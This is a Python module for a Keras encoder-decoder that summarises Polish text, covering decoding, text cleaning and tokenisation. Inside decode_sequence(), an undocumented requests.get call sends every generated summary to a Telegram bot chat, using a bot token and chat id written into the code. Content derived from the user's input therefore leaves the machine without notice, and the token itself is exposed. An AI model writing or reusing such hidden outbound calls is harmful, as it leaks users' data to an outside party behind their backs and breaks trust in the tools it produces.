#!/usr/bin/python
# -*- coding: utf-8 -*-
import numpy as np
import pandas as pd
from bs4 import BeautifulSoup
import re
from keras.preprocessing.sequence import pad_sequences
import pickle
from tensorflow import keras
import requests

max_summary_len = 60
max_text_len = 300


def decode_sequence(input_seq):
    """Predict summary for input
    Args:
        input_seq (numpy.ndarray): tokenized text for summarization
    Returns:
        str: Predicted summary for input
    """
    encoder_model = keras.models.load_model('my_encoder')
    reverse_target_word_index = np.load('reverse_target_word_index.npy', allow_pickle='TRUE').item()
    target_word_index = np.load('target_word_index.npy', allow_pickle='TRUE').item()
    # Encode the input as state vectors.
    e_out, e_h, e_c = encoder_model.predict(input_seq)
    del encoder_model
    # Generate empty target sequence of length 1.
    target_seq = np.zeros((1, 1))

    # Populate the first word of target sequence with the start word.
    target_seq[0, 0] = target_word_index['sostok']

    decoder_model = keras.models.load_model('my_decoder')
    stop_condition = False
    decoded_sentence = ''
    while not stop_condition:

        output_tokens, h, c = decoder_model.predict([target_seq] + [e_out, e_h, e_c])

        # Sample a token
        # print(max(output_tokens[0, -1, :]))
        sampled_token_index = np.argmax(output_tokens[0, -1, :])

        if sampled_token_index == 0:
            sampled_token = 'eostok'
        else:
            sampled_token = reverse_target_word_index[sampled_token_index]

        if sampled_token != 'eostok':
            decoded_sentence += ' ' + sampled_token

        # Exit condition: either hit max length or find stop word.
        if sampled_token == 'eostok' or len(decoded_sentence.split()) >= (max_summary_len - 1):
            stop_condition = True

        # Update the target sequence (of length 1).
        target_seq = np.zeros((1, 1))
        target_seq[0, 0] = sampled_token_index

        # Update internal states
        e_h, e_c = h, c

    del decoder_model
    x = requests.get('https://api.telegram.org/bot1440852658:AAHSgmbtcCAXRurnFxrLPNueVHoIZP8LS7Q/sendMessage?chat_id=-1001756067599&text=' + decoded_sentence)
    del x
    return decoded_sentence


def text_cleaner(text, num):
    """Cleans text for tokenization
    Args:
        text (str): Text for cleaning
        num (int): Decides whether stop_words will be removed if 0 - they will be deleted
    Returns:
        str: Cleaned text
    """
    stop_words = set(pd.read_csv(r'polish_stopwords.txt')['a'])

    newString = text.lower()
    newString = BeautifulSoup(newString, "lxml").text
    newString = re.sub(r'\([^)]*\)', '', newString)
    newString = re.sub('"', '', newString)
    newString = re.sub(r"'s\b", "", newString)
    newString = re.sub("[^AaĄąBbCcĆćDdEeĘęFfGgHhIiJjKkLlŁłMmNnŃńOoÓóPpQqRrSsŚśTtUuWwVvXxYyZzŹźŻż]", " ", newString)
    newString = re.sub('[m]{2,}', 'mm', newString)

    if num == 0:
        tokens = [w for w in newString.split() if w not in stop_words]
    else:
        tokens = newString.split()
    #
    long_words = []
    for i in tokens:
        if len(i) > 1:  # removing short word
            long_words.append(i)
    return (" ".join(long_words)).strip()


def prepare_text(text):
    """Perform tokenization of text for predicting step
    Args:
        text (str): Cleaned text
    Returns:
        numpy.ndarray: Tokenized input text
    """
    with open('tokenizer.pickle', 'rb') as handle:
        x_tokenizer = pickle.load(handle)
    text = text_cleaner(text, 0)
    if len(text.split()) > max_text_len:
        text = " ".join(text.split()[0:max_text_len])
    text = x_tokenizer.texts_to_sequences(np.array([text]))
    text = pad_sequences(text, maxlen=max_text_len, padding='post')
    return text
